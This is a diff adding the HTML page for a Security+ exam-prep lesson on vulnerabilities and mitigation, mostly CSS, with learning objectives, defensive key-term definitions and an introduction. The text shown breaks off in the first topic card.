@@ -1,0 +1,1608 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lesson 4: Vulnerabilities & Mitigation | CompTIA Security+ SY0-701</title>
+<style>
+/* ============================================================
+   DESIGN TOKENS — consistent with lessons 1–3
+   ============================================================ */
+:root {
+  --bg:          #ffffff;
+  --bg-soft:     #f7f9f7;
+  --bg-card:     #ffffff;
+  --border:      #d8e4d8;
+  --border-dark: #b2ccb2;
+  --text:        #111111;
+  --text-mid:    #3a4a3a;
+  --text-muted:  #5c6e5c;
+  --green-dark:  #1b5e20;
+  --green:       #2e7d32;
+  --green-mid:   #388e3c;
+  --green-light: #4caf50;
+  --green-pale:  #e8f5e9;
+  --green-pale2: #c8e6c9;
+  --red:         #b71c1c;
+  --red-pale:    #ffebee;
+  --red-mid:     #c62828;
+  --blue:        #1565c0;
+  --blue-pale:   #e3f2fd;
+  --purple:      #6a1b9a;
+  --purple-pale: #f3e5f5;
+  --amber:       #e65100;
+  --amber-pale:  #fff3e0;
+  --teal:        #00695c;
+  --teal-pale:   #e0f2f1;
+  --shadow-sm:   0 1px 4px rgba(0,0,0,0.08);
+  --shadow-md:   0 4px 16px rgba(0,0,0,0.10);
+  --shadow-lg:   0 8px 32px rgba(0,0,0,0.13);
+  --radius:      10px;
+  --radius-lg:   16px;
+}
+[data-theme="dark"] {
+  --bg:          #0e120e;
+  --bg-soft:     #141a14;
+  --bg-card:     #1a221a;
+  --border:      #2a3a2a;
+  --border-dark: #3a4e3a;
+  --text:        #e8f0e8;
+  --text-mid:    #b8ccb8;
+  --text-muted:  #7a9a7a;
+  --green-dark:  #81c784;
+  --green:       #4caf50;
+  --green-mid:   #66bb6a;
+  --green-light: #a5d6a7;
+  --green-pale:  #1a2e1a;
+  --green-pale2: #1e3a1e;
+  --red:         #ef9a9a;
+  --red-pale:    #2a1010;
+  --red-mid:     #ef9a9a;
+  --blue:        #90caf9;
+  --blue-pale:   #0d1f35;
+  --purple:      #ce93d8;
+  --purple-pale: #1f0d2a;
+  --amber:       #ffcc80;
+  --amber-pale:  #2a1a00;
+  --teal:        #80cbc4;
+  --teal-pale:   #0d2520;
+  --shadow-sm:   0 1px 4px rgba(0,0,0,0.30);
+  --shadow-md:   0 4px 16px rgba(0,0,0,0.40);
+  --shadow-lg:   0 8px 32px rgba(0,0,0,0.50);
+}
+
+/* ============================================================
+   RESET & BASE
+   ============================================================ */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body {
+  font-family: system-ui, -apple-system, 'Segoe UI', Arial, Helvetica, sans-serif;
+  background: var(--bg); color: var(--text);
+  line-height: 1.65; font-size: 16px;
+  transition: background 0.3s, color 0.3s;
+}
+h1,h2,h3,h4 { line-height: 1.25; font-weight: 700; }
+a { color: var(--green); text-decoration: none; }
+a:hover { text-decoration: underline; }
+ul { padding-left: 1.4em; }
+li { margin-bottom: 0.35em; }
+
+/* ============================================================
+   HEADER
+   ============================================================ */
+header {
+  background: var(--green-dark); color: #fff;
+  position: sticky; top: 0; z-index: 200;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.25);
+}
+.header-inner {
+  max-width: 1180px; margin: 0 auto;
+  padding: 14px 24px;
+  display: flex; align-items: center;
+  justify-content: space-between; gap: 16px; flex-wrap: wrap;
+}
+.header-left { display: flex; align-items: center; gap: 14px; }
+.brand-icon {
+  width: 42px; height: 42px;
+  background: rgba(255,255,255,0.15);
+  border: 2px solid rgba(255,255,255,0.3);
+  border-radius: 8px;
+  display: flex; align-items: center; justify-content: center;
+  font-weight: 900; font-size: 14px; letter-spacing: -0.5px; color: #fff; flex-shrink: 0;
+}
+.brand-info h1 { font-size: 1rem; font-weight: 700; }
+.brand-info p  { font-size: 0.74rem; opacity: 0.7; margin-top: 1px; }
+.header-right  { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+.lesson-badge {
+  background: rgba(255,255,255,0.18); border: 1px solid rgba(255,255,255,0.28);
+  color: #fff; font-size: 0.7rem; font-weight: 700;
+  padding: 4px 10px; border-radius: 20px; text-transform: uppercase; letter-spacing: 0.07em;
+}
+.nav-link {
+  background: rgba(255,255,255,0.12); border: 1px solid rgba(255,255,255,0.22);
+  color: #fff; font-size: 0.8rem; font-weight: 600;
+  padding: 6px 14px; border-radius: 20px;
+  transition: background 0.2s; text-decoration: none; display: inline-block;
+}
+.nav-link:hover { background: rgba(255,255,255,0.25); text-decoration: none; }
+.theme-btn {
+  background: rgba(255,255,255,0.12); border: 1px solid rgba(255,255,255,0.22);
+  color: #fff; font-size: 0.8rem; font-weight: 600;
+  padding: 6px 14px; border-radius: 20px; cursor: pointer; transition: background 0.2s;
+}
+.theme-btn:hover { background: rgba(255,255,255,0.25); }
+
+/* ============================================================
+   HERO — amber-tinted for "vulnerability" domain feel
+   ============================================================ */
+.hero {
+  background: linear-gradient(135deg, #1b5e20 0%, #2e7d32 45%, #e6510022 100%);
+  color: #fff; padding: 48px 24px 40px;
+  position: relative; overflow: hidden;
+}
+.hero::after {
+  content: '04';
+  position: absolute; right: 40px; bottom: -10px;
+  font-size: 120px; font-weight: 900;
+  opacity: 0.07; line-height: 1; pointer-events: none;
+}
+.hero-inner { max-width: 860px; margin: 0 auto; }
+.hero-eyebrow {
+  font-size: 0.75rem; font-weight: 700; text-transform: uppercase;
+  letter-spacing: 0.12em; opacity: 0.8; margin-bottom: 10px;
+}
+.hero h2 { font-size: 2rem; font-weight: 800; margin-bottom: 10px; }
+.hero-sub { font-size: 1rem; opacity: 0.85; max-width: 640px; }
+.hero-meta { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 20px; }
+.hero-tag {
+  background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.25);
+  font-size: 0.75rem; font-weight: 600; padding: 4px 12px; border-radius: 20px;
+}
+
+/* ============================================================
+   LAYOUT
+   ============================================================ */
+.page-body { max-width: 1180px; margin: 0 auto; padding: 36px 24px 64px; }
+.section-gap { margin-bottom: 48px; }
+.section-label {
+  font-size: 0.72rem; font-weight: 700; text-transform: uppercase;
+  letter-spacing: 0.12em; color: var(--green);
+  margin-bottom: 14px; padding-bottom: 8px;
+  border-bottom: 2px solid var(--green-pale2);
+  display: flex; align-items: center; gap: 8px;
+}
+.section-label::before {
+  content: ''; display: block; width: 4px; height: 16px;
+  background: var(--green); border-radius: 2px;
+}
+
+/* ============================================================
+   OBJECTIVES
+   ============================================================ */
+.objectives-box {
+  background: var(--green-pale); border: 1px solid var(--green-pale2);
+  border-left: 5px solid var(--green);
+  border-radius: var(--radius); padding: 24px 28px;
+}
+.objectives-box h3 { color: var(--green-dark); margin-bottom: 12px; font-size: 1rem; }
+.objectives-box li { margin-bottom: 8px; color: var(--text-mid); font-size: 0.93rem; }
+.objectives-box li::marker { color: var(--green); }
+
+/* ============================================================
+   KEY TERMS
+   ============================================================ */
+.terms-grid {
+  display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 14px;
+}
+.term-card {
+  background: var(--bg-soft); border: 1px solid var(--border);
+  border-radius: var(--radius); padding: 14px 16px;
+}
+.term-name { font-weight: 700; font-size: 0.88rem; color: var(--green-dark); margin-bottom: 4px; }
+.term-def  { font-size: 0.82rem; color: var(--text-mid); line-height: 1.5; }
+
+/* ============================================================
+   INTRO CARD
+   ============================================================ */
+.intro-card {
+  background: var(--bg-card); border: 1px solid var(--border);
+  border-left: 5px solid var(--green-light);
+  border-radius: var(--radius-lg); padding: 28px 32px; box-shadow: var(--shadow-sm);
+}
+.intro-card p { color: var(--text-mid); font-size: 0.97rem; line-height: 1.75; }
+.intro-card p + p { margin-top: 12px; }
+
+/* ============================================================
+   FLIP CARDS
+   ============================================================ */
+.flip-grid {
+  display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 24px;
+}
+.flip-wrapper { perspective: 1000px; height: 260px; cursor: pointer; }
+.flip-inner {
+  position: relative; width: 100%; height: 100%;
+  transition: transform 0.6s cubic-bezier(0.4,0.2,0.2,1);
+  transform-style: preserve-3d;
+}
+.flip-wrapper.flipped .flip-inner { transform: rotateY(180deg); }
+.flip-front, .flip-back {
+  position: absolute; width: 100%; height: 100%;
+  backface-visibility: hidden; -webkit-backface-visibility: hidden;
+  border-radius: var(--radius-lg); padding: 24px;
+  display: flex; flex-direction: column; justify-content: space-between;
+  border: 1px solid var(--border); box-shadow: var(--shadow-md);
+}
+.flip-front { background: var(--bg-card); }
+.flip-back  { background: var(--green-dark); color: #fff; transform: rotateY(180deg); }
+.flip-num   { font-size: 2.5rem; font-weight: 900; color: var(--green-pale2); line-height: 1; }
+.flip-front h3 { font-size: 1.05rem; color: var(--green-dark); margin-bottom: 6px; }
+.flip-front p  { font-size: 0.82rem; color: var(--text-muted); }
+.flip-hint { font-size: 0.7rem; color: var(--text-muted); }
+.flip-back h3  { font-size: 0.95rem; font-weight: 700; margin-bottom: 8px; opacity: 0.9; }
+.flip-back p   { font-size: 0.82rem; opacity: 0.85; line-height: 1.55; flex: 1; }
+
+/* ── Flip-back link row: View + Download ── */
+.flip-back-links {
+  display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px;
+}
+.flip-back a.dive-link {
+  display: inline-block; background: rgba(255,255,255,0.15);
+  border: 1px solid rgba(255,255,255,0.3);
+  color: #fff; font-size: 0.78rem; font-weight: 700;
+  padding: 6px 14px; border-radius: 20px; text-decoration: none;
+  transition: background 0.2s; align-self: flex-start;
+}
+.flip-back a.dive-link:hover { background: rgba(255,255,255,0.28); }
+.flip-back a.dive-download {
+  display: inline-block; background: rgba(255,255,255,0.08);
+  border: 1px solid rgba(255,255,255,0.22);
+  color: #fff; font-size: 0.75rem; font-weight: 600;
+  padding: 6px 12px; border-radius: 20px; text-decoration: none;
+  transition: background 0.2s; align-self: flex-start;
+}
+.flip-back a.dive-download:hover { background: rgba(255,255,255,0.22); text-decoration: none; }
+
+/* ============================================================
+   TOPIC SECTIONS
+   ============================================================ */
+.topic-section {
+  background: var(--bg-card); border: 1px solid var(--border);
+  border-radius: var(--radius-lg); overflow: hidden;
+  margin-bottom: 28px; box-shadow: var(--shadow-sm);
+}
+.topic-header {
+  background: var(--green); color: #fff;
+  padding: 18px 28px; display: flex; align-items: center; gap: 14px;
+}
+.topic-header-num {
+  width: 36px; height: 36px; background: rgba(0,0,0,0.2); border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 0.9rem; font-weight: 900; flex-shrink: 0;
+}
+.topic-header h3 { font-size: 1.1rem; }
+.topic-header p  { font-size: 0.8rem; opacity: 0.85; margin-top: 2px; }
+.topic-body { padding: 28px; }
+.topic-grid   { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 18px; }
+.topic-grid-3 { display: grid; grid-template-columns: repeat(3,1fr); gap: 16px; margin-top: 18px; }
+
+.concept-block {
+  background: var(--bg-soft); border: 1px solid var(--border);
+  border-radius: var(--radius); padding: 18px;
+}
+.concept-block h4 {
+  font-size: 0.92rem; color: var(--green-dark);
+  margin-bottom: 8px; display: flex; align-items: center; gap: 8px;
+}
+.concept-icon {
+  width: 24px; height: 24px; background: var(--green-pale2);
+  border-radius: 6px; display: inline-flex; align-items: center;
+  justify-content: center; font-size: 13px;
+}
+.concept-block p,
+.concept-block ul { font-size: 0.87rem; color: var(--text-mid); line-height: 1.6; }
+
+/* Vulnerability surface cards */
+.vuln-card {
+  background: var(--bg-soft); border: 1px solid var(--border);
+  border-radius: var(--radius); padding: 16px;
+  border-left: 4px solid var(--amber);
+}
+.vuln-card h4 { font-size: 0.9rem; margin-bottom: 8px; color: var(--text); display: flex; align-items: center; gap: 8px; }
+.vuln-card p,
+.vuln-card ul { font-size: 0.84rem; color: var(--text-mid); line-height: 1.55; }
+.vuln-card ul  { margin-top: 6px; }
+
+/* Severity badge */
+.sev-badge {
+  font-size: 0.64rem; font-weight: 800; text-transform: uppercase;
+  letter-spacing: 0.07em; padding: 2px 8px; border-radius: 10px; flex-shrink: 0;
+}
+.sev-critical { background: #b71c1c22; color: var(--red); }
+.sev-high     { background: var(--amber-pale); color: var(--amber); }
+.sev-medium   { background: var(--blue-pale); color: var(--blue); }
+
+/* Mitigation strategy cards */
+.mit-card {
+  background: var(--bg-card); border: 1px solid var(--border);
+  border-left: 4px solid var(--green);
+  border-radius: var(--radius); padding: 18px;
+}
+.mit-card h4 { font-size: 0.92rem; color: var(--green-dark); margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+.mit-card p,
+.mit-card ul { font-size: 0.84rem; color: var(--text-mid); line-height: 1.55; }
+
+/* Callouts */
+.callout {
+  background: var(--green-pale); border-left: 4px solid var(--green);
+  border-radius: 0 var(--radius) var(--radius) 0;
+  padding: 14px 18px; margin-top: 16px;
+  font-size: 0.87rem; color: var(--text-mid);
+}
+.callout strong { color: var(--green-dark); }
+.callout-amber {
+  background: var(--amber-pale); border-left: 4px solid var(--amber);
+  border-radius: 0 var(--radius) var(--radius) 0;
+  padding: 14px 18px; margin-top: 16px;
+  font-size: 0.87rem; color: var(--text-mid);
+}
+.callout-amber strong { color: var(--amber); }
+.callout-red {
+  background: var(--red-pale); border-left: 4px solid var(--red);
+  border-radius: 0 var(--radius) var(--radius) 0;
+  padding: 14px 18px; margin-top: 16px;
+  font-size: 0.87rem; color: var(--text-mid);
+}
+.callout-red strong { color: var(--red-mid); }
+.callout-blue {
+  background: var(--blue-pale); border-left: 4px solid var(--blue);
+  border-radius: 0 var(--radius) var(--radius) 0;
+  padding: 14px 18px; margin-top: 16px;
+  font-size: 0.87rem; color: var(--text-mid);
+}
+.callout-blue strong { color: var(--blue); }
+
+/* CVSS mini-display */
+.cvss-bar-wrap { margin-top: 10px; }
+.cvss-row { display: flex; align-items: center; gap: 10px; margin-bottom: 7px; font-size: 0.8rem; color: var(--text-mid); }
+.cvss-label { width: 130px; flex-shrink: 0; font-weight: 600; }
+.cvss-bar-bg {
+  flex: 1; height: 8px; background: var(--border);
+  border-radius: 4px; overflow: hidden;
+}
+.cvss-bar-fill { height: 100%; border-radius: 4px; }
+.fill-critical { background: var(--red); }
+.fill-high     { background: var(--amber); }
+.fill-medium   { background: var(--blue); }
+.fill-low      { background: var(--green); }
+.cvss-score    { width: 32px; text-align: right; font-weight: 700; flex-shrink: 0; }
+
+/* Web vuln table */
+.web-table {
+  width: 100%; border-collapse: collapse; margin-top: 16px; font-size: 0.84rem;
+}
+.web-table th {
+  background: var(--green-dark); color: #fff;
+  padding: 10px 14px; text-align: left; font-size: 0.79rem; letter-spacing: 0.04em;
+}
+.web-table td {
+  padding: 10px 14px; border-bottom: 1px solid var(--border);
+  color: var(--text-mid); vertical-align: top;
+}
+.web-table tr:nth-child(even) td { background: var(--bg-soft); }
+.web-table tr:hover td { background: var(--green-pale); }
+
+/* ============================================================
+   ACTIVITIES — common
+   ============================================================ */
+.activity-box {
+  background: var(--bg-card); border: 2px solid var(--green-pale2);
+  border-radius: var(--radius-lg); overflow: hidden; box-shadow: var(--shadow-md);
+}
+.activity-header {
+  background: var(--green-dark); color: #fff;
+  padding: 16px 24px; display: flex; align-items: center; gap: 12px;
+}
+.activity-badge {
+  background: rgba(255,255,255,0.18); border: 1px solid rgba(255,255,255,0.28);
+  font-size: 0.68rem; font-weight: 700; padding: 3px 10px; border-radius: 20px;
+  letter-spacing: 0.06em; text-transform: uppercase;
+}
+.activity-header h3 { font-size: 1rem; }
+.activity-header p  { font-size: 0.8rem; opacity: 0.8; margin-top: 2px; }
+.activity-body { padding: 24px; }
+.activity-instructions {
+  background: var(--bg-soft); border: 1px solid var(--border);
+  border-radius: var(--radius); padding: 12px 16px;
+  font-size: 0.85rem; color: var(--text-mid); margin-bottom: 20px;
+}
+.activity-result {
+  margin-top: 14px; padding: 12px 16px; border-radius: var(--radius);
+  font-size: 0.88rem; font-weight: 600; display: none;
+}
+.result-pass { background: var(--green-pale); color: var(--green-dark); border: 1px solid var(--green-pale2); }
+.result-fail { background: var(--red-pale); color: var(--red); border: 1px solid #ffcdd2; }
+.activity-actions { margin-top: 18px; display: flex; gap: 10px; align-items: center; }
+.btn-primary {
+  background: var(--green-dark); color: #fff; border: none;
+  padding: 10px 22px; border-radius: 8px; font-size: 0.9rem; font-weight: 700;
+  cursor: pointer; transition: background 0.2s, transform 0.15s;
+}
+.btn-primary:hover { background: var(--green); transform: translateY(-1px); }
+.btn-secondary {
+  background: var(--bg-soft); color: var(--text);
+  border: 1px solid var(--border-dark); padding: 10px 22px;
+  border-radius: 8px; font-size: 0.9rem; font-weight: 600; cursor: pointer;
+  transition: background 0.2s;
+}
+.btn-secondary:hover { background: var(--border); }
+
+/* ============================================================
+   ACTIVITY 1 — DRAG & DROP mitigation matcher
+   ============================================================ */
+.drag-pool {
+  display: flex; flex-wrap: wrap; gap: 10px;
+  margin-bottom: 24px; min-height: 60px;
+  background: var(--bg-soft); border: 1px dashed var(--border-dark);
+  border-radius: var(--radius); padding: 14px;
+}
+.drag-item {
+  background: var(--green-dark); color: #fff;
+  padding: 7px 14px; border-radius: 20px;
+  font-size: 0.8rem; font-weight: 600;
+  cursor: grab; user-select: none;
+  transition: transform 0.15s, opacity 0.15s, box-shadow 0.15s;
+  box-shadow: var(--shadow-sm);
+}
+.drag-item:hover { transform: translateY(-2px); box-shadow: var(--shadow-md); }
+.drag-item.dragging { opacity: 0.35; }
+.drop-zones-mit {
+  display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px;
+}
+.drop-zone {
+  border: 2px dashed var(--border-dark); border-radius: var(--radius);
+  padding: 12px; min-height: 110px;
+  transition: border-color 0.2s, background 0.2s;
+}
+.drop-zone.drag-over { border-color: var(--green); background: var(--green-pale); }
+.drop-zone-label {
+  font-size: 0.74rem; font-weight: 700; text-transform: uppercase;
+  letter-spacing: 0.06em; color: var(--text-muted);
+  margin-bottom: 8px; display: flex; align-items: center; gap: 6px;
+}
+.dz-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; }
+.dropped-item {
+  display: inline-block; padding: 4px 11px; border-radius: 20px;
+  font-size: 0.76rem; font-weight: 600; margin: 3px;
+}
+.dropped-item.correct   { background: var(--green-pale2); color: var(--green-dark); border: 1px solid var(--green); }
+.dropped-item.incorrect { background: var(--red-pale); color: var(--red); border: 1px solid var(--red); animation: shake 0.35s; }
+.dropped-item .rm { margin-left: 5px; cursor: pointer; opacity: 0.6; }
+.dropped-item .rm:hover { opacity: 1; }
+@keyframes shake {
+  0%,100% { transform: translateX(0); }
+  20% { transform: translateX(-5px); }
+  40% { transform: translateX(5px); }
+  60% { transform: translateX(-3px); }
+  80% { transform: translateX(3px); }
+}
+
+/* ============================================================
+   ACTIVITY 2 — CASE STUDY: VULN TRIAGE
+   ============================================================ */
+.triage-grid {
+  display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 20px;
+}
+.triage-vuln {
+  background: var(--bg-soft); border: 1px solid var(--border);
+  border-radius: var(--radius); padding: 16px; cursor: pointer;
+  transition: border-color 0.2s, background 0.2s;
+  user-select: none;
+}
+.triage-vuln.selected { border-color: var(--green); background: var(--green-pale); }
+.triage-vuln h4 { font-size: 0.88rem; color: var(--text); margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
+.triage-vuln p  { font-size: 0.82rem; color: var(--text-mid); line-height: 1.5; }
+.triage-detail  {
+  background: var(--bg-card); border: 1px solid var(--border);
+  border-radius: var(--radius-lg); padding: 22px; display: none;
+}
+.triage-detail.visible { display: block; }
+.triage-detail h4 { font-size: 1rem; color: var(--green-dark); margin-bottom: 14px; }
+.detail-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 14px; margin-bottom: 14px; }
+.detail-cell {
+  background: var(--bg-soft); border: 1px solid var(--border);
+  border-radius: var(--radius); padding: 12px 14px;
+}
+.detail-cell-label { font-size: 0.68rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.07em; color: var(--text-muted); margin-bottom: 5px; }
+.detail-cell-val   { font-size: 0.88rem; font-weight: 600; color: var(--text); }
+.detail-mits { margin-top: 12px; }
+.detail-mits h5 { font-size: 0.85rem; font-weight: 700; color: var(--green-dark); margin-bottom: 8px; }
+.mit-pill {
+  display: inline-block; padding: 4px 12px; border-radius: 20px; margin: 3px;
+  font-size: 0.78rem; font-weight: 600;
+  background: var(--green-pale2); color: var(--green-dark); border: 1px solid var(--green);
+}
+
+/* ============================================================
+   QUIZ
+   ============================================================ */
+.quiz-q {
+  background: var(--bg-card); border: 1px solid var(--border);
+  border-radius: var(--radius); padding: 20px 24px;
+  margin-bottom: 16px; transition: border-color 0.3s;
+}
+.quiz-q.answered-correct { border-color: var(--green); background: var(--green-pale); }
+.quiz-q.answered-wrong   { border-color: var(--red);   background: var(--red-pale); }
+.q-num  { font-size: 0.72rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; color: var(--text-muted); margin-bottom: 8px; }
+.q-text { font-size: 0.95rem; font-weight: 600; color: var(--text); margin-bottom: 14px; line-height: 1.45; }
+.q-options { display: flex; flex-direction: column; gap: 8px; }
+.q-option {
+  display: flex; align-items: flex-start; gap: 10px;
+  padding: 10px 14px; background: var(--bg-soft);
+  border: 1px solid var(--border); border-radius: var(--radius);
+  cursor: pointer; font-size: 0.88rem;
+  transition: background 0.2s, border-color 0.2s;
+}
+.q-option:hover { background: var(--green-pale); border-color: var(--green-light); }
+.q-option input[type="radio"] { margin-top: 1px; flex-shrink: 0; accent-color: var(--green); }
+.q-option.correct { background: var(--green-pale2); border-color: var(--green); color: var(--green-dark); font-weight: 600; }
+.q-option.wrong   { background: var(--red-pale); border-color: var(--red); color: var(--red); }
+.q-feedback { margin-top: 12px; padding: 12px 16px; border-radius: var(--radius); font-size: 0.85rem; line-height: 1.55; display: none; }
+.q-feedback.show { display: block; }
+.q-feedback.pass { background: var(--green-pale); color: var(--green-dark); border: 1px solid var(--green-pale2); }
+.q-feedback.fail { background: var(--red-pale); color: var(--red); border: 1px solid #ffcdd2; }
+.quiz-submit-row { margin-top: 20px; display: flex; align-items: center; gap: 14px; }
+#quiz-result {
+  padding: 18px 24px; border-radius: var(--radius-lg);
+  font-size: 1rem; font-weight: 700; display: none; margin-top: 20px;
+}
+.quiz-pass { background: var(--green-pale); color: var(--green-dark); border: 2px solid var(--green-pale2); }
+.quiz-fail { background: var(--red-pale); color: var(--red); border: 2px solid #ffcdd2; }
+
+/* ============================================================
+   PAGE FOOTER
+   ============================================================ */
+.page-footer {
+  background: var(--bg-soft); border-top: 1px solid var(--border);
+  padding: 24px; text-align: center; font-size: 0.78rem; color: var(--text-muted);
+}
+.footer-nav { display: flex; justify-content: center; gap: 20px; margin-bottom: 12px; flex-wrap: wrap; }
+.footer-nav a { color: var(--green); font-weight: 600; font-size: 0.85rem; }
+
+/* ============================================================
+   RESPONSIVE
+   ============================================================ */
+@media (max-width: 768px) {
+  .hero h2 { font-size: 1.4rem; }
+  .topic-grid, .topic-grid-3, .triage-grid, .detail-row,
+  .drop-zones-mit { grid-template-columns: 1fr; }
+  .flip-grid { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+
+<!-- ============================================================
+     HEADER
+     ============================================================ -->
+<header>
+  <div class="header-inner">
+    <div class="header-left">
+      <div class="brand-icon">S+</div>
+      <div class="brand-info">
+        <h1>CompTIA Security+ SY0-701</h1>
+        <p>Lesson 4 of 12 &mdash; Vulnerabilities &amp; Mitigation</p>
+      </div>
+    </div>
+    <div class="header-right">
+      <span class="lesson-badge">Day 4</span>
+      <a href="index.html" class="nav-link">&#8592; Course Home</a>
+      <a href="lesson03.html" class="nav-link">&#8592; Lesson 3</a>
+      <button class="theme-btn" onclick="toggleTheme()" id="themeBtn">🌙 Dark</button>
+    </div>
+  </div>
+</header>
+
+<!-- ============================================================
+     HERO
+     ============================================================ -->
+<div class="hero">
+  <div class="hero-inner">
+    <div class="hero-eyebrow">Lesson 4 &mdash; Threats, Vulnerabilities &amp; Mitigations (22% of exam)</div>
+    <h2>Vulnerabilities &amp; Mitigation</h2>
+    <p class="hero-sub">OS, application, mobile, cloud, and web vulnerabilities — and the patching, hardening, segmentation, isolation, and access control strategies that neutralize them. The defender's core skill set.</p>
+    <div class="hero-meta">
+      <span class="hero-tag">📖 3 Topics</span>
+      <span class="hero-tag">🎯 2 Activities</span>
+      <span class="hero-tag">📝 5-Question Quiz</span>
+      <span class="hero-tag">⏱ ~60 min</span>
+      <span class="hero-tag">Domain: Threats, Vulnerabilities &amp; Mitigations</span>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================================
+     PAGE BODY
+     ============================================================ -->
+<div class="page-body">
+
+  <!-- LEARNING OBJECTIVES -->
+  <div class="section-gap">
+    <div class="section-label">Learning Objectives</div>
+    <div class="objectives-box">
+      <h3>By the end of this lesson, you will be able to:</h3>
+      <ul>
+        <li>Identify common vulnerability categories across operating systems, applications, mobile platforms, cloud environments, and web applications.</li>
+        <li>Explain how misconfigurations create exploitable vulnerabilities and describe the conditions that allow exploits to succeed.</li>
+        <li>Distinguish among patching, hardening, segmentation, isolation, and access control as mitigation strategies, and match each to the vulnerability types it best addresses.</li>
+        <li>Interpret a vulnerability's CVSS score and use it to prioritize remediation decisions in a risk-based framework.</li>
+        <li>Analyze the OWASP Top 10 web application vulnerabilities and describe injection, broken authentication, and SSRF in operational terms.</li>
+        <li>Construct a layered mitigation strategy for a given environment by selecting appropriate controls from multiple mitigation categories.</li>
+        <li>Justify remediation prioritization decisions using a combination of CVSS severity, business impact, and exploitability factors.</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- KEY TERMS -->
+  <div class="section-gap">
+    <div class="section-label">Key Terms</div>
+    <div class="terms-grid">
+      <div class="term-card">
+        <div class="term-name">Vulnerability</div>
+        <div class="term-def">A weakness in a system, application, or process that could be exploited by a threat actor to cause harm. Vulnerabilities may be technical (software bugs), operational (misconfigurations), or physical (unlocked server room).</div>
+      </div>
+      <div class="term-card">
+        <div class="term-name">Exploit</div>
+        <div class="term-def">The act of taking advantage of a vulnerability to gain unauthorized access, elevate privileges, execute code, or cause damage. An exploit can be manual or automated, and may be delivered as a piece of software (an exploit kit).</div>
+      </div>
+      <div class="term-card">
+        <div class="term-name">Hardening</div>
+        <div class="term-def">The process of reducing a system's attack surface by disabling unnecessary services, removing default accounts, applying secure configurations, and enforcing least-privilege access. Hardening makes exploitation harder even when vulnerabilities exist.</div>
+      </div>
+      <div class="term-card">
+        <div class="term-name">Segmentation</div>
+        <div class="term-def">Dividing a network into smaller, isolated zones (segments) to contain breaches and limit lateral movement. Segments are enforced using firewalls, VLANs, and access control lists. Critical assets are placed in higher-security segments.</div>
+      </div>
+      <div class="term-card">
+        <div class="term-name">Misconfiguration</div>
+        <div class="term-def">A security vulnerability caused by incorrect or insecure configuration of a system, service, or cloud resource — such as leaving default credentials in place, exposing admin interfaces publicly, or granting excessive permissions. The #1 cause of cloud breaches.</div>
+      </div>
+      <div class="term-card">
+        <div class="term-name">Patch Management</div>
+        <div class="term-def">The systematic process of identifying, acquiring, testing, and applying software updates (patches) that fix known vulnerabilities. Effective patch management programs prioritize patches by severity and maintain a documented patch cadence.</div>
+      </div>
+      <div class="term-card">
+        <div class="term-name">CVSS (Common Vulnerability Scoring System)</div>
+        <div class="term-def">A standardized framework for rating the severity of software vulnerabilities on a 0–10 scale. CVSS scores consider attack vector, complexity, privileges required, user interaction, and impact on confidentiality, integrity, and availability.</div>
+      </div>
+      <div class="term-card">
+        <div class="term-name">Attack Surface</div>
+        <div class="term-def">The total set of exposure points through which a threat actor might attempt exploitation — including network ports, web interfaces, APIs, user accounts, physical access points, and third-party integrations. Reducing the attack surface is a foundational hardening goal.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- INTRO -->
+  <div class="section-gap">
+    <div class="section-label">Course Introduction</div>
+    <div class="intro-card">
+      <p>Knowing what threat actors want (Lesson 3) means little if you cannot identify the weaknesses they exploit to get it. Vulnerabilities are the gaps — technical, operational, and architectural — that make systems exploitable. Every major breach in the past decade has ultimately been rooted in a vulnerability that was either unknown, unpatched, or misconfigured. The security professional's job is to find those gaps before the adversary does and close them through systematic mitigation.</p>
+      <p>This lesson builds the vocabulary and decision-making framework you need to perform that job. You will learn how vulnerabilities are classified across the attack surface — from kernel-level OS flaws to cloud storage misconfigurations to SQL injection in web apps — and how to recommend the right mitigation strategy for each. The skills in this lesson are directly tested in Security+ scenario questions where you must read a vulnerability description and select the correct countermeasure from a set of plausible options.</p>
+    </div>
+  </div>
+
+  <!-- FLIP CARDS -->
+  <div class="section-gap">
+    <div class="section-label">Topic Navigation — Click a Card to Explore</div>
+    <div class="flip-grid">
+
+      <div class="flip-wrapper" onclick="this.classList.toggle('flipped')" tabindex="0" onkeypress="if(event.key==='Enter')this.classList.toggle('flipped')">
+        <div class="flip-inner">
+          <div class="flip-front">
+            <div>
+              <div class="flip-num">01</div>
+              <h3>OS, Application &amp; Mobile Vulnerabilities</h3>
+              <p>Kernel exploits, privilege escalation, buffer overflows, memory corruption, side-channel attacks, and mobile-specific weaknesses.</p>
+            </div>
+            <div class="flip-hint">🔄 Click to flip</div>
+          </div>
+          <div class="flip-back">
+            <div>
+              <h3>OS, App &amp; Mobile</h3>
+              <p>OS vulnerabilities include kernel flaws, privilege escalation, and unpatched services. Application flaws include buffer overflows, race conditions, and insecure defaults. Mobile adds sideloading risks, insecure storage, and over-privileged apps. CVSS guides prioritization.</p>
+            </div>
+            <div class="flip-back-links">
+              <a class="dive-link" href="lesson04-part01.png" target="_blank" rel="noopener">View Graphic &#8594;</a>
